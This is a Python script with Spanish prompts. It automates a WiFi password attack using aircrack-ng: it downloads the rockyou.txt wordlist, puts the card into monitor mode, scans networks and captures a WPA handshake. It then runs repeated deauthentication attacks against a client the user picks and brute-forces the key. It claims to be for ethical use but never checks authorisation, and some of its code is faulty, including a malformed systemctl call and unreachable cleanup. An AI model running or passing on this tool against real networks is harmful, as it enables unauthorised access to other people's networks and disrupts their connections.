import subprocess
import time
import signal
import glob

def mostrar_banner():
    print(r"""
*********************************
 _             _  __ _       _   
| |____      _(_)/ _(_)_ __ | |_ 
| '_ \ \ /\ / / | |_| | '_ \| __|
| | | \ V  V /| |  _| | |_) | |_ 
|_| |_|\_/\_/ |_|_| |_| .__/ \__|
                      |_|          
            
*********************************
""")

mostrar_banner()

print("Vamos a empezar a hackear el wifi con fines éticos si tiene una contraseña insegura")

def detectar_sistema_operativo():
    try:

        resultado = subprocess.run(["lsb_release", "-d"], capture_output=True, text=True)
        if resultado.returncode == 0:
            descripcion = resultado.stdout.lower()
            if "arch" in descripcion or "manjaro" in descripcion:
                return "Arch Linux / Manjaro", "1"
            elif "fedora" in descripcion or "red hat" in descripcion or "rhel" in descripcion or "centos" in descripcion:

                return "Fedora / RHEL / CentOS", "2"
            elif "debian" in descripcion or "ubuntu" in descripcion:
                return "Distribución basada en Debian/Ubuntu", "4"
    except Exception:
        pass


    try:
        with open("/etc/os-release", "r") as f:
            contenido = f.read().lower()
            if "arch" in contenido or "manjaro" in contenido:
                return "Arch Linux / Manjaro", "1"
            elif "fedora" in contenido or "red hat" in contenido or "rhel" in contenido or "centos" in contenido:
                return "Fedora / RHEL / CentOS", "2"
            elif "debian" in contenido or "ubuntu" in contenido:
                return "Distribución basada en Debian/Ubuntu", "4"
    except Exception:
        pass

    return None, None

os_detectado, opcion_os = detectar_sistema_operativo()
if os_detectado:
    print(f"\nDetectado sistema operativo: {os_detectado}")
    respuesta_os = input("¿Es correcto? (si/no): ").strip().lower()
    if respuesta_os != "si":
        os_detectado = None

if not os_detectado:
    print("\n¿Qué sistema operativo tienes? Selecciona el número:")
    print("1--> Arch Linux / Manjaro")
    print("2--> Fedora / RHEL / CentOS")
    print("3--> Fedora/RHEL/CentOS (versiones antiguas)")
    print("4--> Distribución basada en Debian/Ubuntu")
    opcion_os = input("Opción: ").strip()


while True:
    print("\n¿Tienes instalado aircrack-ng? (si/no)")
    respuesta_instalacion = input().strip().lower()

    if respuesta_instalacion == "no":
        if opcion_os == "1":
            print("Instalando en Arch Linux/Manjaro...")
            subprocess.run(["sudo", "pacman", "-Sy", "aircrack-ng", "--noconfirm"])
        elif opcion_os == "2":
            print("Instalando en Fedora/RHEL/CentOS...")
            subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng"])
        elif opcion_os == "3":
            print("Instalando en versiones antiguas...")
            subprocess.run(["sudo", "yum", "install", "-y", "aircrack-ng"])
        elif opcion_os == "4":
            print("Instalando en Debian/Ubuntu...")
            subprocess.run("sudo apt update && sudo apt install -y aircrack-ng", shell=True)
        break

    elif respuesta_instalacion == "si":
        break


print("¿Tienes un fichero de contraseñas?")
print("si/no")
decision_directorio = input().strip().lower()

if decision_directorio == "no":
    subprocess.run(["sudo", "wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"])
else:
    print("Ok, sigamos")


while True:
    print("\n¿Sabes cuál es tu tarjeta de red? (si/no)")
    respuesta_tarjeta = input().strip().lower()

    if respuesta_tarjeta == "si":
        break
    elif respuesta_tarjeta == "no":
        print("\nMostrando interfaces de red...")
        subprocess.run(["ip", "a"])
        print("\nBusca la interfaz WiFi (generalmente wlan0, wlp2s0, etc.)")
        time.sleep(2)

print("\nIntroduce el nombre de tu tarjeta de red (ej: wlan0):")
tarjeta = input().strip()


print(f"\nPoniendo {tarjeta} en modo monitor...")
subprocess.run(["sudo", "airmon-ng", "check", "kill"])
subprocess.run(["sudo", "airmon-ng", "start", tarjeta])


print("\nEscaneando redes WiFi...")
print("¿Cuántos segundos quieres escanear?")
try:
    tiempo_auditoria = int(input())
except ValueError:
    print("Error: Introduce un número válido")
    exit(1)

proceso = subprocess.Popen(["sudo", "airodump-ng", f"{tarjeta}mon"])

try:
    time.sleep(tiempo_auditoria)
except KeyboardInterrupt:
    print("\nEscaneo interrumpido")
finally:
    proceso.terminate()
    proceso.wait()
    subprocess.run(["sudo", "pkill", "airodump-ng"])


print("\n¿Quieres continuar? (si/no)")
seguir_1 = input().strip().lower()

if seguir_1 == "no":
    print("\nDeteniendo modo monitor...")
    subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
    print("Modo monitor detenido")
    print("¿que sistema operativo husas?")
    print("habilitando internet")
    if opcion_os == "1":
        print("habilitando wifi en Arch Linux/Manjaro...")
        result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
        if result.returncode != 0:
            subprocess.run(["sudo", "systemctl", "subprocess.run"])
        exit()
    elif opcion_os == "2":
        print("Instalando en Fedora/RHEL/CentOS...")
        subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
        exit()
    elif opcion_os == "3":
        print("Instalando en versiones antiguas...")
        subprocess.run(["sudo", "service", "network", "restart"])
        exit()
    elif opcion_os == "4":
        print("Instalando en Debian/Ubuntu...")
        result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
        if result.returncode != 0:
            subprocess.run(["sudo", "systemctl", "restart", "networking"])
        exit()
    exit()
if seguir_1 == "si":
    print("\nContinuando con el proceso...")

print("Ahora dime los datos de la red")
print("Necesito:")
print("BSSID:")
BSSID = input().strip()
print("Canal (CH):")
CH = input().strip()

subprocess.run(["sudo", "iwconfig", f"{tarjeta}mon", "channel", CH])

print("Ahora te voy a mostrar un comando que deberás abrir en otra terminal para capturar el handshake")
print("Primero dime el nombre del archivo donde guardarás la auditoría:")
nombre_auditoria = input().strip()
print(f"\nEl comando es:\nsudo airodump-ng -c {CH} --bssid {BSSID} -w {nombre_auditoria} {tarjeta}mon")
print("Cuando alguien se conecte, deberás introducir la STATION del dispositivo")


station = input("Introduce la STATION (MAC del dispositivo): ").strip()


print("¿Cuántas peticiones quieres mandar por vez? (recomendado 9)")
peticiones = input().strip()
if not peticiones.isdigit():
    print("Número de peticiones inválido")
    exit(1)

print("¿Ejecutar ahora el ataque de desautenticación? (si/no)")
decision_desautentificacion1 = input().strip().lower()

if decision_desautentificacion1 == "si":
    subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
elif decision_desautentificacion1 == "no":
    archivos = glob.glob(nombre_auditoria + "*")
    if archivos:
        subprocess.run(["sudo", "rm", "-f"] + archivos)
    exit()


while True:
    print("¿Mandar otra vez el ataque? (si/no)")
    decision = input().strip().lower()
    if decision == "si":
        subprocess.run(["sudo", "aireplay-ng", "--ignore-negative-one", "-0", peticiones, "-a", BSSID, "-c", station, f"{tarjeta}mon"])
    elif decision == "no":
        break


print("Perfecto, solo queda un paso.")
print("¿El script te ha descargado el diccionario rockyou.txt? (si/no)")
instalado = input().strip().lower()

if instalado == "si":
    directorio = "rockyou.txt"
else:
    directorio = input("Introduce la ruta del diccionario: ").strip()


print("¿Empezar ya con la fuerza bruta para sacar la contraseña? (si/no)")
decision_final = input().strip().lower()

if decision_final == "si":
    subprocess.run(["sudo", "aircrack-ng", "-b", BSSID, "-w", directorio, nombre_auditoria + "-01.cap"])
else:
    archivos = glob.glob(nombre_auditoria + "*")
    if archivos:
        subprocess.run(["sudo", "rm", "-f"] + archivos)
    exit()
if decision_final == "no":
    print("\nDeteniendo modo monitor...")
    subprocess.run(["sudo", "airmon-ng", "stop", f"{tarjeta}mon"])
    print("Modo monitor detenido")
    print("¿que sistema operativo husas?")
    print("habilitando internet")
    if opcion_os == "1":
        print("habilitando wifi en Arch Linux/Manjaro...")
        subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
        archivos = glob.glob(nombre_auditoria + "*")
        if archivos:
            subprocess.run(["sudo", "rm", "-f"] + archivos)
        exit()
    elif opcion_os == "2":
        print("Instalando en Fedora/RHEL/CentOS...")
        subprocess.run(["sudo", "systemctl", "restart", "network-online.target"])
        archivos = glob.glob(nombre_auditoria + "*")
        if archivos:
            subprocess.run(["sudo", "rm", "-f"] + archivos)
        exit()
    elif opcion_os == "3":
        print("Instalando en versiones antiguas...")
        subprocess.run(["sudo", "service", "network", "restart"])
        archivos = glob.glob(nombre_auditoria + "*")
        if archivos:
            subprocess.run(["sudo", "rm", "-f"] + archivos)
        exit()
    elif opcion_os == "4":
        print("Instalando en Debian/Ubuntu...")
        result = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"])
        if result.returncode != 0:
            subprocess.run(["sudo", "systemctl", "restart", "networking"])
        archivos = glob.glob(nombre_auditoria + "*")
        if archivos:
            subprocess.run(["sudo", "rm", "-f"] + archivos)
        exit()
